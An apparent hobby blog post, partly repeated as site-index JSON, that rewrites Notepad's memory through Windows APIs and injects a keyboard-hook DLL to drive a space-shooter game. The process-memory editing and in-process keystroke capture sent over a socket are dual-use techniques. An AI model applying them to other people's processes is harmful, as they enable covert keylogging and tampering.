(memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE){ char *lpBuffer = (char *)malloc(memInfo.RegionSize); ReadProcessMemory(hproc, base, lpBuffer, memInfo.RegionSize, NULL); char* match = FindPattern(lpBuffer, memInfo.RegionSize, pattern, patternLen); if (match){ uint64_t diff = (uint64_t)match - (uint64_t)(lpBuffer); char* processPtr = (char *)base + diff; return processPtr; } } } // cout << endl << endl; skip ++; base += memInfo.RegionSize; } return nullptr; } To find pattern, first we'll initiate a pointer, ptr , points to the base address of target region. Then we'll move up until ptr is region size away from the base address. This can be done using this code: char* FindPattern(char* src, size_t srcLen, const char* pattern, size_t patternLen){ char* cur = src; size_t curPos = 0; while (curPos < srcLen){ if (memcmp(cur, pattern, patternLen) == 0){ return cur; } curPos++; cur = &src[curPos]; } return nullptr; } Next up, it's time to change the value and we all done. Change value There's a problem with changing value in memory address: 1) Value is changed but notepad's display may not be updated immediately. Manual interact with notepad process is required. 2) Region size is fixed. Updated value is constrained within that box. Tackling (1) is not that hard. Windows offers InvalidateRect functionality, which can force a process's window to update. bool UpdateProcessMemory(DWORD proc_id, LPVOID base, size_t size){ HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, proc_id); MEMORY_BASIC_INFORMATION memInfo; // char *payload = UTF16Convert((char *)target.c_str()); if(!WriteProcessMemory(hproc, base, buffer, size, NULL)){ return false; } RECT r; GetClientRect(notepad_hwnd, &r); InvalidateRect(notepad_hwnd, &r, false); return true; } Let's get into space shooter for notepad Space shooter Each line in notepad associates with one memory address. To make a game, we'll need to have the control of entire screen or notepad windows. To achieve this, the simplest way is to enable word wrap in notepad; we just have to deal with 1 giant word (1 memory address). However, recording keyboard input is not that easy. There's one way we can global hook keyboard; however, this will make anytime we press a key, an action will be initiated to space shooter game, no matter if we have notepad process as active window or not. To achieve this, we can install hook inside notepad process, then use socket api to transfer key stroke out to the main program to update space shooter. Our plan here in general is to build a dll that acts both like a keystroke capture and a socket client. We'll then hook that dll into notepad process. SetWindowsHookExA really actually helps hook keyboard with a dll. Payload dll should be loaded first by LoadLibraryA . Once it's loaded, export function will be accessible to main program, whose address got by GetProcessAddress can be used in SetWindowsHookExA . void InstallHook(DWORD thread_id){ TCHAR dll_path[MAX_PATH]; GetFullPathName(TEXT(\"./keyboard_dll.dll\"), MAX_PATH, dll_path, NULL); cout << dll_path << endl; HMODULE hooklib = LoadLibraryA((LPCSTR)dll_path); HOOKPROC hookfunc = (HOOKPROC)GetProcAddress(hooklib, \"HookProcedure\"); HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD, hookfunc, hooklib, thread_id); cout << \"Run\" << endl; while(GetMessage(NULL, NULL, WM_KEYFIRST, WM_KEYLAST)){} UnhookWindowsHookEx(keyboardhook); } I'll not discuss how to set up socket server and client using windows api here, but this documentation might help: Socket Client and Socket Server Putting it all together, dll and server code can be found in my Github repo I'll not discuss in detail the logic of game shooter here, but the code for it can be found in my Github repo as well The full code can be found here . Here's some result:","title":"Note tapper"},{"location":"2024_9_1_notepad_tapper/#notepad-tapper","text":"Sep 1 2024 Disclaimer: The techniques discussed here work on Windows 10 notepad, but not Windows 11 notepad","title":"Notepad tapper"},{"location":"2024_9_1_notepad_tapper/#introduction","text":"In this blog, I'll discuss how you can change data displayed on notepad process using code, and then showcase a simple space shooter game for notepad. We'll use windows api and Cheat Engine to achieve this. For more information of Cheat Engine, please visit: https://wiki.cheatengine.org/index.php?title=Tutorials:Cheat_Engine_Tutorial_Guide_x64 . This blog is inspired by Kyle Halladay 's post: Hooking Keyboard Input To Play Snake In Notepad.exe","title":"Introduction"},{"location":"2024_9_1_notepad_tapper/#initial-observe","text":"With Cheat Engine, we can find the address of specific word within notepad process (what we're trying to do). As of notepad, though it specifically say UTF_8 at the bottom right corner, data is actually encoded by UTF_16. How we know it? Let's examine using Cheat Engine. Let's try to find address of hello in the memory Fire up Cheat Engine and search for hello in UTF_8 we have nothing in return However, if we change the search to UTF_16, an address pops up Change value of this memory address will result in change in notepad process. With this in mind, we'll use code to automate our process. First, we'll try to find the memmory address associated with a value matched target pattern. Then. we'll try to change the value, and update the windows.","title":"Initial Observe"},{"location":"2024_9_1_notepad_tapper/#find-pattern","text":"VirtualQueryEx will help us run through all memmory address of target process (region size, data, premission, ...). We then check if the region has COMMIT and READWRITE permission. Once we capture all of those region, we'll initiate our find pattern function to find our target address. char* GetProcessMemory(DWORD proc_id, char *pattern, size_t patternLen){ HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, proc_id); LPVOID base = 0x0; MEMORY_BASIC_INFORMATION memInfo; size_t bytesread; int skip = 0; while (VirtualQueryEx(hproc, base, &memInfo, sizeof(memInfo))){ if (skip > 4){ if (memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE){ char *lpBuffer = (char *)malloc(memInfo.RegionSize); ReadProcessMemory(hproc, base, lpBuffer, memInfo.RegionSize, NULL); char* match = FindPattern(lpBuffer, memInfo.RegionSize, pattern, patternLen); if (match){ uint64_t diff = (uint64_t)match - (uint64_t)(lpBuffer); char* processPtr = (char *)base + diff; return processPtr; } } } // cout << endl << endl; skip ++; base += memInfo.RegionSize; } return nullptr; } To find pattern, first we'll initiate a pointer, ptr , points to the base address of target region. Then we'll move up until ptr is region size away from the base address. This can be done using this code: char* FindPattern(char* src, size_t srcLen, const char* pattern, size_t patternLen){ char* cur = src; size_t curPos = 0; while (curPos < srcLen){ if (memcmp(cur, pattern, patternLen) == 0){ return cur; } curPos++; cur = &src[curPos]; } return nullptr; } Next up, it's time to change the value and we all done.","title":"Find pattern"},{"location":"2024_9_1_notepad_tapper/#change-value","text":"There's a problem with changing value in memory address: 1) Value is changed but notepad's display may not be updated immediately. Manual interact with notepad process is required. 2) Region size is fixed. Updated value is constrained within that box. Tackling (1) is not that hard. Windows offers InvalidateRect functionality, which can force a process's window to update. bool UpdateProcessMemory(DWORD proc_id, LPVOID base, size_t size){ HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, proc_id); MEMORY_BASIC_INFORMATION memInfo; // char *payload = UTF16Convert((char *)target.c_str()); if(!WriteProcessMemory(hproc, base, buffer, size, NULL)){ return false; } RECT r; GetClientRect(notepad_hwnd, &r); InvalidateRect(notepad_hwnd, &r, false); return true; } Let's get into space shooter for notepad","title":"Change value"},{"location":"2024_9_1_notepad_tapper/#space-shooter","text":"Each line in notepad associates with one memory address. To make a game, we'll need to have the control of entire screen or notepad windows. To achieve this, the simplest way is to enable word wrap in notepad; we just have to deal with 1 giant word (1 memory address). However, recording keyboard input is not that easy. There's one way we can global hook keyboard; however, this will make anytime we press a key, an action will be initiated to space shooter game, no matter if we have notepad process as active window or not. To achieve this, we can install hook inside notepad process, then use socket api to transfer key stroke out to the main program to update space shooter. Our plan here in general is to build a dll that acts both like a keystroke capture and a socket client. We'll then hook that dll into notepad process. SetWindowsHookExA really actually helps hook keyboard with a dll. Payload dll should be loaded first by LoadLibraryA . Once it's loaded, export function will be accessible to main program, whose address got by GetProcessAddress can be used in SetWindowsHookExA . void InstallHook(DWORD thread_id){ TCHAR dll_path[MAX_PATH]; GetFullPathName(TEXT(\"./keyboard_dll.dll\"), MAX_PATH, dll_path, NULL); cout << dll_path << endl; HMODULE hooklib = LoadLibraryA((LPCSTR)dll_path); HOOKPROC hookfunc = (HOOKPROC)GetProcAddress(hooklib, \"HookProcedure\"); HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD, hookfunc, hooklib, thread_id); cout << \"Run\" << endl; while(GetMessage(NULL, NULL, WM_KEYFIRST, WM_KEYLAST)){} UnhookWindowsHookEx(keyboardhook); } I'll not discuss how to set up socket server and client using windows api here, but this documentation might help: Socket Client and Socket Server Putting it all together, dll and server code can be found in my Github repo I'll not discuss in detail the logic of game shooter here, but the code for it can be found in my Github repo as well The full code can be found here . Here's some result:","title":"Space shooter"}]}
>>>>>>> 901cbc2af0d038a8e4a14f0dfa879f9a09f8914a
